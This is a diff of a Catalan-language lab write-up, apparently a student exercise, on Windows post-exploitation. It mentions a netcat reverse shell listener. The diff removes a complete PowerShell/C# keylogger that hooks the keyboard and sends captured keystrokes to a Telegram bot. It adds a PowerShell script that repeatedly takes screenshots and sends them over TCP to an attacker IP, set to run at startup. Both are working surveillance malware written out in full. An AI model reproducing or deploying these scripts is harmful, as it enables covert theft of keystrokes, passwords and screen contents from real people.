@@ -387,133 +387,56 @@ A services.msc podem veure que el servei està efectivament actiu.
 
 Ara comprovem que la reverse shell funciona reiniciant l'ordinador. Haurem de tenir un nc escoltant al port 4444.
 
-### Apartat 2. Keylogger amb enviament de dades a bot de Telegram.
+### Apartat 2. Keylogger amb enviament de dades a TCP.
 
-<img width="800" height="624" alt="imatge" src="https://github.com/user-attachments/assets/15be4977-9f3f-49a5-8e23-6bb840e3ce9f" />
+<img width="855" height="614" alt="imatge" src="https://github.com/user-attachments/assets/2dcd8921-8836-404c-af5b-de8c1fb7b3ae" />
 
-Entrem a Telegram i busquem @BotFather. Iniciem un xat i escrivim _/newbot_
+Creem un script python al ordinador que actuarà com servidor. 
 
-<img width="486" height="483" alt="imatge" src="https://github.com/user-attachments/assets/bc7730d3-04ed-4c99-a52f-4b44aa9eb408" />
+<img width="814" height="130" alt="imatge" src="https://github.com/user-attachments/assets/1b712393-dbe7-4168-8f3f-16915596df6a" />
 
-Li donem nom al bot i li assignem un usuari. En el ultim missatge ens haurà otorgat un token (està censurat). L'haurem de guardar.
+Ens assegurem que tinguem pil instal·lat.
 
-<img width="514" height="620" alt="imatge" src="https://github.com/user-attachments/assets/a7c138b4-dfe6-45eb-99c5-3e861d8dd953" />
+<img width="690" height="618" alt="imatge" src="https://github.com/user-attachments/assets/0abac98d-a30c-4777-b27e-4518992f421b" />
 
-Li enviem un missatge al nostre bot per poder rebre el chat id.
-
-<img width="427" height="906" alt="imatge" src="https://github.com/user-attachments/assets/d0065bb8-3cd6-40c0-8603-cc6ed65292bf" />
-
-Accedim a _https://api.telegram.org/bot<TOKEN>/getUpdates_ i veurem el json. Haurem de buscar el chat id. 
-
-<img width="947" height="696" alt="imatge" src="https://github.com/user-attachments/assets/c9b8c72d-9761-47eb-99f7-878636b8679d" />
-
-Creem el script següent i el guardem en format ps1.
+Creem un script ps1 en un directori accessible com _C:\Users\Public_. 
 
 ```bash
+$ip   = "192.168.x.x"   # IP de l'atacant
+$port = 4446
+$interval = 3
 
-$botToken = "TOKEN"
-$chatId   = "CHAT_ID"
-$logFile  = "$env:TEMP\klog.txt"
-$interval = 60   # segons entre enviaments
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-# ---------- 1. DEFINICIÓ DEL GANXO DE TECLAT ----------
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.IO;
-using System.Windows.Forms;
-
-public class KeyHook {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_SYSKEYDOWN = 0x0104;
-
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
-
-    public static void Start() {
-        _hookID = SetHook(_proc);
-        Application.Run();   // bucle de missatges (necessari per rebre el ganxo)
-        UnhookWindowsHookEx(_hookID);
-    }
-
-    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
-        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
-        using (var curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            Keys key = (Keys)vkCode;
-            string k = key.ToString();
-
-            // Traducció simple de tecles especials
-            if (k.Length == 1) {
-                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), k);
-            } else if (k == "Space") {
-                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), " ");
-            } else if (k == "Return") {
-                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), Environment.NewLine);
-            } else if (k == "Back") {
-                // No podem esborrar del fitxer fàcilment; ho marquem
-                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), "[BACK]");
-            } else {
-                File.AppendAllText(Path.Combine(Path.GetTempPath(), "klog.txt"), "[" + k + "]");
-            }
-        }
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
-    }
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-}
-"@ -ReferencedAssemblies System.Windows.Forms
-
-# ---------- 2. INICIAR EL GANXO ----------
-# Executem el ganxo dins un Job perquè no bloquegi aquest fil
-Start-Job -ScriptBlock {
-    [KeyHook]::Start()
-} | Out-Null
-
-# ---------- 3. BUCLE D'ENVIAMENT A TELEGRAM ----------
 while ($true) {
+    try {
+        $bounds = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+        $g = [Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
+
+        $ms = New-Object System.IO.MemoryStream
+        $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
+        $bytes = $ms.ToArray()
+
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.Connect($ip, $port)
+        $stream = $client.GetStream()
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Close()
+        $client.Close()
+
+        $bmp.Dispose(); $g.Dispose(); $ms.Dispose()
+    } catch { }
+
     Start-Sleep -Seconds $interval
-
-    if (Test-Path $logFile) {
-        $content = Get-Content $logFile -Raw
-        if ($content -and $content.Trim().Length -gt 0) {
-            try {
-                Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
-                    -Method Post `
-                    -Body @{ chat_id = $chatId; text = $content } | Out-Null
-                Clear-Content $logFile   # Buidar després d'enviar
-            } catch {
-                # Silenci: si falla l'enviament, no volem soroll
-            }
-        }
-    }
 }
-
 ```
 
-<img width="605" height="469" alt="imatge" src="https://github.com/user-attachments/assets/562b495c-7e15-4ba4-901a-f717f4eda618" />
+<img width="928" height="311" alt="imatge" src="https://github.com/user-attachments/assets/91f18b95-005d-4705-8a5c-b85f0743f7c2" />
 
-Guardem l'arxiu ps1.
+Configurem l'arrancada i després reiniciem l'ordinador.
 
+<img width="1875" height="953" alt="imatge" src="https://github.com/user-attachments/assets/e097a59c-0fdd-4856-bb8d-3d3f25db1f9a" />
+
+Ara al nostre host, si executem _python server.py_ rebrem la captura de pantalla d'aquell moment.
